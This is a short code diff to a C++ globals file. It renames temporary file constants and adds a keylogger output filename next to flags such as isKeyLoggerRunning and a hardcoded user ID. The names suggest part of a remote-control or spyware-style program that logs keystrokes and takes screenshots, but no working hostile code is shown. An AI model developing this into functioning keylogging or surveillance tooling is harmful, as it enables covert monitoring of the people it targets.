@@ -1,8 +1,5 @@
 #include "globals.h"
 
-const char* filename = "temp.txt";
-const char* cdfilename = "cdtemp.txt";
-const std::wstring scrname = L"scr.bmp";
 bool isKeyLoggerRunning = false;
 bool isConversationRunning = false;
 const int64_t sashaId = 1041837892;
@@ -14,6 +11,7 @@ the program will not accept commands, but will accept what
 the mode is set to (path to folder, flags for executing subtasks, etc.)
 */
 
+const std::string klFilename = "kltemp.txt";
 Mode currentMode = Mode::STANDARD;
 bool isWaitingForFile = false;
 bool isMusicPlaying = false;
